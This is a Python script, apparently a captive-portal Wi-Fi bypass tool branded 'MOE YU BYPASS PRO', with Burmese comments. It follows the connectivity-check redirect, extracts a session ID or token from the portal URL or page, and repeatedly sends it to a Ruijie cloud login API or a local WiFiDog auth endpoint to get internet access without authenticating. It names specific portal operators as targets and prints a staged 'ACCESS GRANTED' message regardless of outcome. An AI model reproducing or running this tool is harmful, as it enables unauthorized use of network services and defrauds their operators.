import requests
import re
import urllib3
import time
import threading
import sys
import os
import uuid
import random
import socket
from urllib.parse import urlparse, parse_qs
from rich.console import Console
from rich.panel import Panel
from rich.align import Align
from rich.text import Text

# ===============================
# CONFIG & INITIALIZATION
# ===============================
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

# Connection တည်ငြိမ်စေရန်
PING_THREADS = 1 
PING_INTERVAL = 2.0 

GREEN = "\033[92m"
RED = "\033[91m"
CYAN = "\033[96m"
RESET = "\033[0m"

BABY_LOGO = """
[bold cyan]
      _      
    _(_)_    
   (_)@(_)   [white] <( Let's Play! )[/white]
     (_)\  / 
      /  ||  
  ___/___||___
 |____________|
[/bold cyan]
"""

BANNER = """
[bold #00FF00]
 ╔╦╗╔═╗╔═╗  ╦ ╦╦ ╦
 ║║║║ ║║╣   ╚╦╝║ ║
 ╩ ╩╚═╝╚═╝   ╩ ╚═╝
      [#00FF00]M O E   Y U   H A C K E R[/#00FF00]
[/bold #00FF00]
"""

def get_hwid():
    id_file = os.path.expanduser("~/.moe_yu_id")
    try:
        if os.path.exists(id_file):
            with open(id_file, "r") as f: return f.read().strip()
        new_id = f"MOE-{str(uuid.uuid4())[:8].upper()}-{random.randint(100, 999)}"
        with open(id_file, "w") as f: f.write(new_id)
        return new_id
    except: return "MOE-998A7F92-675"

def get_current_gateway():
    """Socket ဖြင့် Gateway ကို ရှာဖွေခြင်း (ip: not found fix)"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return ".".join(local_ip.split('.')[:-1]) + ".1"
    except:
        return "192.168.110.1"

def hacker_typing(text, style="bold green"):
    console.print("[bold #00FF00]>>> [/bold #00FF00]", end="")
    for char in text:
        console.print(Text(char, style=style), end="")
        sys.stdout.flush()
        time.sleep(0.02)
    console.print()

# ===============================
# BYPASS ENGINE (FINAL VERSION)
# ===============================
def start_bypass_process():
    while True:
        try:
            # Session headers များထည့်သွင်းခြင်း
            session = requests.Session()
            session.headers.update({
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36"
            })
            
            # ၁။ Portal URL ကို Redirect လိုက်၍ဖမ်းယူခြင်း
            r = session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=10, allow_redirects=True)
            portal_url = r.url
            
            # ၂။ SID Parsing Logic
            params = parse_qs(urlparse(portal_url).query)
            sid = (params.get('sessionId') or params.get('session_id') or 
                   params.get('token') or params.get('auth_id') or [None])[0]
            
            if not sid:
                # URL မှာမတွေ့လျှင် HTML Page ကိုဖတ်၍ Regex ဖြင့်ရှာခြင်း
                r1 = session.get(portal_url, timeout=10, verify=False)
                sid_match = re.search(r'(?:sessionId|session_id|token|auth_id)=([a-zA-Z0-9_\-]+)', r1.text)
                sid = sid_match.group(1) if sid_match else None
            
            if sid:
                current_gw = get_current_gateway()
                
                # Cham Myae Thaw Tar Cloud Portal ပုံစံလား စစ်ဆေးခြင်း
                if "ruijienetworks.com" in portal_url or "portal-as" in portal_url:
                    auth_link = f"https://portal-as.ruijienetworks.com/api/auth/login?sessionId={sid}"
                    mode = "RUIJIE-CLOUD"
                else:
                    # Local Router စနစ် (Zin Myo Aung, Ko Naing)
                    auth_link = f"http://{current_gw}:2060/wifidog/auth?token={sid}"
                    mode = "LOCAL-BYPASS"
                
                def pulse():
                    while True:
                        try:
                            session.get(auth_link, timeout=10)
                            sys.stdout.write(f"{GREEN}[✓] {mode} | SID: {sid[:10]}... | ACTIVE{RESET}\n")
                            sys.stdout.flush()
                        except: pass
                        time.sleep(PING_INTERVAL)

                threading.Thread(target=pulse, daemon=True).start()
                
                # အင်တာနက် status ကိုစောင့်ကြည့်ခြင်း
                while True:
                    try:
                        if session.get("http://www.google.com", timeout=5).status_code == 200:
                            time.sleep(15)
                        else: break
                    except: break
            else:
                sys.stdout.write(f"{RED}[-] TARGET SID NOT FOUND. RETRYING...{RESET}\n")
                time.sleep(3)
        except Exception as e:
            time.sleep(5)

if __name__ == "__main__":
    console.clear()
    console.print(Align.center(BABY_LOGO))
    console.print(Align.center(BANNER))
    
    my_hwid = get_hwid()
    console.print(Align.center(Panel(f"[bold white]YOUR HWID: [yellow]{my_hwid}[/yellow][/bold white]", border_style="cyan", expand=False)))
    
    hacker_typing("INITIALIZING SYSTEM COMPONENTS...")
    hacker_typing(f"DETECTED GATEWAY: {get_current_gateway()}")
    hacker_typing("AUTHENTICATION SUCCESS: ACCESS GRANTED")
    
    console.print(Panel.fit("[bold red]🔥 MOE YU BYPASS PRO v7.8 IS RUNNING 🔥[/bold red]", border_style="white"))
    
    try:
        start_bypass_process()
    except KeyboardInterrupt:
        sys.exit()
